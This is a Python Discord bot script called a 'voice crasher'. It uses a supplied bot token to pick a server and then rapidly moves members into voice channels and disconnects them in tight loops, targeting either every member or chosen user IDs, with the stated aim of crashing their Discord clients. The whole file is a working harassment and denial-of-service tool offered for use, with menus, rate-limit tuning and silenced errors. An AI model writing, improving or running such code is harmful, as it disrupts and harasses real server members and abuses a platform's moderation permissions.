import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import sys

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗          ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗         ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║         ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║         ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
║                                                                                       ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗███████╗                      ║
║                    ██║   ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝                      ║
║                    ██║   ██║██║   ██║██╔██╗ ██║██║     █████╗                        ║
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║     ██╔══╝                        ║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║╚██████╗███████╗                      ║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝                      ║
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA VOICE CRASHER v2.0                  ║  ║
║                    ║          CONSOLE SELECTION + VOICE JOINER                    ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# Global variables
selected_guild = None
selected_voice_channels = []
crash_interval = 0.1
running_crashes = {}
target_users = []

# ============================================
# COLORS FOR CONSOLE
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# VOICE CRASHER FUNCTION
# ============================================
async def voice_crash_loop(user, voice_channels, interval, iterations, guild):
    """Make a user join and leave voice channels rapidly to crash their Discord"""
    
    print(f"{Colors.CYAN}    [!] STARTING CRASH ON: {user.name}{Colors.RESET}")
    
    for i in range(iterations):
        if user.id in running_crashes and not running_crashes[user.id]:
            break
            
        for vc in voice_channels:
            try:
                # Move user to voice channel
                await user.move_to(vc)
                await asyncio.sleep(interval / 2)
                
                # Move user away (disconnect)
                await user.move_to(None)
                await asyncio.sleep(interval / 2)
                
            except Exception as e:
                pass
        
        # Show progress every 10 iterations
        if (i + 1) % 10 == 0:
            print(f"{Colors.YELLOW}        └─ PROGRESS: {i+1}/{iterations} cycles{Colors.RESET}")
    
    print(f"{Colors.GREEN}    ✓ COMPLETED CRASH ON: {user.name}{Colors.RESET}")
    
    # Clean up
    if user.id in running_crashes:
        running_crashes[user.id] = False

async def crash_all_users(guild, voice_channels, interval, iterations):
    """Crash all users in the guild"""
    
    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] STARTING MASS VOICE CRASH ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    
    members = guild.members
    total_users = len([m for m in members if not m.bot])
    
    print(f"{Colors.CYAN}[*] TARGETING {total_users} USERS...{Colors.RESET}")
    print(f"{Colors.CYAN}[*] VOICE CHANNELS: {len(voice_channels)}{Colors.RESET}")
    print(f"{Colors.CYAN}[*] INTERVAL: {interval}s{Colors.RESET}")
    print(f"{Colors.CYAN}[*] ITERATIONS: {iterations} cycles{Colors.RESET}\n")
    
    crashed = 0
    failed = 0
    
    for member in members:
        if not member.bot:
            try:
                # Check if user is in a voice channel, disconnect them first
                if member.voice and member.voice.channel:
                    try:
                        await member.move_to(None)
                        await asyncio.sleep(0.5)
                    except:
                        pass
                
                # Start crash loop
                running_crashes[member.id] = True
                asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
                crashed += 1
                
                print(f"{Colors.GREEN}    ✓ CRASH STARTED ON: {member.name} ({crashed}/{total_users}){Colors.RESET}")
                
                # Small delay to avoid rate limits
                await asyncio.sleep(0.2)
                
            except Exception as e:
                failed += 1
                print(f"{Colors.RED}    ✗ FAILED: {member.name}{Colors.RESET}")
    
    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓] VOICE CRASH COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • SUCCESSFUL: {crashed}{Colors.RESET}")
    print(f"{Colors.RED}    • FAILED: {failed}{Colors.RESET}")
    print(f"{Colors.CYAN}    • TOTAL TARGETS: {total_users}{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")

async def crash_specific_users(guild, voice_channels, interval, iterations, user_ids):
    """Crash specific users by ID"""
    
    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] CRASHING SPECIFIC USERS ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    
    crashed = 0
    not_found = 0
    
    for user_id in user_ids:
        member = guild.get_member(user_id)
        if member and not member.bot:
            try:
                if member.voice and member.voice.channel:
                    try:
                        await member.move_to(None)
                        await asyncio.sleep(0.5)
                    except:
                        pass
                
                running_crashes[member.id] = True
                asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
                crashed += 1
                print(f"{Colors.GREEN}    ✓ CRASH STARTED ON: {member.name}{Colors.RESET}")
                await asyncio.sleep(0.2)
            except:
                print(f"{Colors.RED}    ✗ FAILED: {member.name}{Colors.RESET}")
        else:
            not_found += 1
            print(f"{Colors.RED}    ✗ USER NOT FOUND: {user_id}{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}✓ CRASHED {crashed} USERS | {not_found} NOT FOUND{Colors.RESET}")

# ============================================
# DISPLAY FUNCTIONS
# ============================================
def show_servers(guilds):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}                    📋 AVAILABLE SERVERS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    for i, guild in enumerate(guilds, 1):
        member_count = len(guild.members)
        channel_count = len(guild.channels)
        voice_count = len(guild.voice_channels)
        
        print(f"{Colors.GREEN}  [{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
        print(f"      ├─ 🆔 ID: {guild.id}")
        print(f"      ├─ 👥 Members: {member_count}")
        print(f"      ├─ 💬 Channels: {channel_count}")
        print(f"      └─ 🎧 Voice Channels: {voice_count}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")

def show_voice_channels_with_members(guild):
    voice_channels = guild.voice_channels
    channels_with_members = []
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}                    🎧 VOICE CHANNELS WITH MEMBERS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    for i, vc in enumerate(voice_channels, 1):
        members_in_vc = len(vc.members)
        if members_in_vc > 0:
            channels_with_members.append(vc)
            member_names = [m.name for m in vc.members[:5]]
            member_list = ", ".join(member_names)
            if len(vc.members) > 5:
                member_list += f" +{len(vc.members)-5} more"
            
            print(f"{Colors.GREEN}  [{len(channels_with_members)}]{Colors.RESET} {Colors.WHITE}{vc.name}{Colors.RESET}")
            print(f"      ├─ 🆔 ID: {vc.id}")
            print(f"      ├─ 👥 Members in VC: {members_in_vc}")
            print(f"      └─ 📝 Members: {member_list}\n")
        else:
            print(f"{Colors.RED}  [X]{Colors.RESET} {vc.name} {Colors.RED}(EMPTY){Colors.RESET}")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    return channels_with_members

def show_all_voice_channels(guild):
    voice_channels = guild.voice_channels
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}                    🎧 ALL VOICE CHANNELS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    for i, vc in enumerate(voice_channels, 1):
        members_count = len(vc.members)
        status = f"{Colors.GREEN}{members_count} members{Colors.RESET}" if members_count > 0 else f"{Colors.RED}EMPTY{Colors.RESET}"
        
        print(f"{Colors.GREEN}  [{i}]{Colors.RESET} {Colors.WHITE}{vc.name}{Colors.RESET}")
        print(f"      ├─ 🆔 ID: {vc.id}")
        print(f"      ├─ 👥 Members: {members_count}")
        print(f"      └─ 🔘 Status: {status}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    return voice_channels

# ============================================
# MAIN MENU
# ============================================
async def select_targets_menu(guild):
    global selected_voice_channels, crash_interval
    
    while True:
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}                    🎯 VOICE CRASHER CONFIGURATION{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
        print(f"""
{Colors.CYAN}  CURRENT CONFIGURATION:{Colors.RESET}
  ┌─────────────────────────────────────────────────────────────┐
  │  📁 Server: {Colors.WHITE}{guild.name[:40]}{Colors.RESET}
  │  🎧 Voice Channels Selected: {Colors.GREEN}{len(selected_voice_channels)}{Colors.RESET}
  │  ⏱️  Crash Interval: {Colors.GREEN}{crash_interval}s{Colors.RESET}
  │  🔄 Default Iterations: {Colors.GREEN}100 cycles{Colors.RESET}
  └─────────────────────────────────────────────────────────────┘

{Colors.BOLD}{Colors.YELLOW}  OPTIONS:{Colors.RESET}
  {Colors.GREEN}[1]{Colors.RESET} Select Voice Channels to crash
  {Colors.GREEN}[2]{Colors.RESET} Set Crash Interval (seconds between joins)
  {Colors.GREEN}[3]{Colors.RESET} START CRASH - All Members
  {Colors.GREEN}[4]{Colors.RESET} START CRASH - Specific Users (by ID)
  {Colors.GREEN}[5]{Colors.RESET} Show Current Voice Channels Status
  {Colors.GREEN}[6]{Colors.RESET} Back to Server Selection
""")
        
        choice = input(f"{Colors.YELLOW}📌 CHOOSE OPTION: {Colors.RESET}")
        
        if choice == "1":
            # Show all voice channels
            all_vcs = show_all_voice_channels(guild)
            
            print(f"\n{Colors.CYAN}📌 SELECT VOICE CHANNELS (comma separated, e.g., 1,3,5 or 'all'):{Colors.RESET}")
            selection = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
            
            selected_voice_channels = []
            if selection.lower() == 'all':
                selected_voice_channels = all_vcs
            else:
                try:
                    indices = [int(x.strip()) for x in selection.split(',')]
                    for idx in indices:
                        if 1 <= idx <= len(all_vcs):
                            selected_voice_channels.append(all_vcs[idx-1])
                except:
                    print(f"{Colors.RED}❌ INVALID SELECTION!{Colors.RESET}")
            
            if selected_voice_channels:
                print(f"\n{Colors.GREEN}✅ SELECTED {len(selected_voice_channels)} VOICE CHANNELS:{Colors.RESET}")
                for vc in selected_voice_channels:
                    print(f"    • {vc.name} ({len(vc.members)} members)")
            else:
                print(f"{Colors.RED}❌ NO CHANNELS SELECTED!{Colors.RESET}")
        
        elif choice == "2":
            print(f"\n{Colors.CYAN}📌 ENTER CRASH INTERVAL (seconds between joins, default 0.1):{Colors.RESET}")
            print(f"{Colors.RED}⚠️  Lower = Faster crash but more rate limits{Colors.RESET}")
            interval_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
            try:
                crash_interval = float(interval_input)
                if crash_interval < 0.05:
                    crash_interval = 0.05
                print(f"{Colors.GREEN}✅ INTERVAL SET TO: {crash_interval}s{Colors.RESET}")
            except:
                print(f"{Colors.RED}❌ INVALID! Using default 0.1s{Colors.RESET}")
                crash_interval = 0.1
        
        elif choice == "3":
            if not selected_voice_channels:
                print(f"{Colors.RED}❌ SELECT VOICE CHANNELS FIRST!{Colors.RESET}")
                continue
            
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  YOU ARE ABOUT TO CRASH ALL MEMBERS IN THE SERVER!{Colors.RESET}")
            confirm = input(f"{Colors.YELLOW}TYPE 'yes' TO CONFIRM: {Colors.RESET}")
            
            if confirm.lower() == 'yes':
                await crash_all_users(guild, selected_voice_channels, crash_interval, 100)
                input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
        
        elif choice == "4":
            if not selected_voice_channels:
                print(f"{Colors.RED}❌ SELECT VOICE CHANNELS FIRST!{Colors.RESET}")
                continue
            
            print(f"\n{Colors.CYAN}📌 ENTER USER IDs (comma separated):{Colors.RESET}")
            user_ids_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
            
            try:
                user_ids = [int(x.strip()) for x in user_ids_input.split(',')]
                await crash_specific_users(guild, selected_voice_channels, crash_interval, 100, user_ids)
                input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
            except:
                print(f"{Colors.RED}❌ INVALID USER IDs!{Colors.RESET}")
        
        elif choice == "5":
            show_voice_channels_with_members(guild)
            input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
        
        elif choice == "6":
            break
        
        else:
            print(f"{Colors.RED}❌ INVALID OPTION!{Colors.RESET}")

# ============================================
# MAIN BOT EVENT
# ============================================
@bot.event
async def on_ready():
    clear_screen()
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✓ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✓ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✓ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    await asyncio.sleep(1)
    
    while True:
        guilds = bot.guilds
        
        if not guilds:
            print(f"{Colors.RED}❌ NO SERVERS FOUND! BOT IS NOT IN ANY SERVER{Colors.RESET}")
            break
        
        show_servers(guilds)
        
        try:
            choice = input(f"\n{Colors.YELLOW}📌 SELECT SERVER NUMBER (or 'q' to quit): {Colors.RESET}")
            
            if choice.lower() == 'q':
                print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
                await bot.close()
                sys.exit()
            
            server_num = int(choice)
            if 1 <= server_num <= len(guilds):
                selected_guild = guilds[server_num - 1]
                print(f"\n{Colors.GREEN}✅ SELECTED: {selected_guild.name}{Colors.RESET}")
                await select_targets_menu(selected_guild)
            else:
                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}❌ ENTER A VALID NUMBER!{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
            await bot.close()
            sys.exit()

# ============================================
# RUN BOT
# ============================================
try:
    bot.run(TOKEN)
except Exception as e:
    print(f"{Colors.RED}❌ ERROR: {e}{Colors.RESET}")
